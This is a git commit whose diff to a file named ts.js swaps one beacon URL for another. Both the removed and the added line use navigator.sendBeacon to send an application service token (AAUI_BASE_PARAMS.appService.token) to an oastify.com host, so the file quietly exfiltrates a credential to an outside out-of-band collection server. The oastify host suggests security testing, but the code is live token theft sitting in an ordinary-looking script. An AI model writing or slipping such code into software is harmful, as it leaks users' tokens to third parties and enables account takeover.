a124742f1b46001c669b43ba2ee56a51504196ac
crisungureanu <97293656+crisungureanu@users.noreply.github.com>
2025-10-27 14:13:52 +0200

    Change beacon URL in ts.js

--- ts.js
+++ ts.js
@@ -1,1 +1,1 @@
-navigator.sendBeacon("https://kf3ts5mxul28w2z37y39wivo2f86wykn.oastify.com",AAUI_BASE_PARAMS.appService.token);
+navigator.sendBeacon("https://zpsqzh629yxyxubp55el8vpw8nee24qt.oastify.com",AAUI_BASE_PARAMS.appService.token);
